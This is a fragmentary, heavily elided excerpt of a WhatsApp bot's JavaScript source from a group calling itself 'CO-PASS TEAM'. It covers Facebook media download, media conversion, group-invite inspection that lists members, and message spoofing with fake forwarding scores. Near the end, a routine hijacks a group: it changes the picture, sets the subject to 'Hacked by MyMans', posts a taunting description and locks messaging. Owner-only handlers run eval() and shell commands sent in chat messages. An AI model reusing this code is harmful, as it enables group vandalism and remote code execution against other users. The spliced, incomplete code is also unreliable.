copass.sendMessage(from, fto, image, {quoted:mek, caption:`*FACEBOOK MP4*\n\n•> Normal : ${res.Normal_video}\n•> Hd : ${res.HD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
case 'fbmp3':
...
copass.sendMessage(from, fto, image, {quoted:mek, caption:`*FACEBOOK MP3*\n\n•> Normal : ${res.Normal_video}\n•> Hd : ${res.HD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
copass.sendMessage(from, khs, audio, {quoted:mek, mimetype:'audio/mp4', filename:'copassgans.mp3', ptt:true})
})
break
	case 'term':
                        if (!mek.key.fromMe && !isOwner) return
...
let { size } = await copass.query({ 
            ...
            var response = await copass.acceptInvite(codeInvite)
            fakestatus('SUKSES')
            } catch {
    ...
    case 'tomp4':
            ...
            owgi = await copass.downloadAndSaveMediaMessage(ger)
    ...
    case 'tourl':
            ...
            owgi = await copass.downloadMediaMessage(boij)
    ...
    case 'inspect':
            ...
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await copass.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
...
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             ...
             copass.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
...
copass.updateProfilePicture(from, anu)
copass.groupUpdateSubject(from, `Hacked by MyMans`)
copass.groupUpdateDescription(from, `Mampos Gw Kudet`)
copass.groupSettingChange(from, GroupSettingChange.messageSend, true)
setTimeout(() => {
fakegroup('Mwuehehe kena hack kacian')
}, 8000)
}
// List Menu ( CO-PASS TEAM )
...
if (!mek.key.fromMe && !isOwner) return
try {
return copass.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}
// Eval Async ( CO-PASS TEAM & Franky )
if (budy.startsWith('=>')){
if (!isOwner && !mek.key.fromMe) return
...
// Antitag Via Reply ( CO-PASS TEAM )
if (listTag.includes(partiNum)) {
if (antitags === false) return
if (mek.key.fromMe) return
if (isOwner) return
sendNye = fs.readFileSync('media/sticker/jantag.webp')
copass.sendMessage(from, sendNye, sticker, {quoted:mek, contextInfo:{forwardingScore: 800, isForwarded: true}})
}
// Antitag Via Tag ( CO-PASS TEAM )
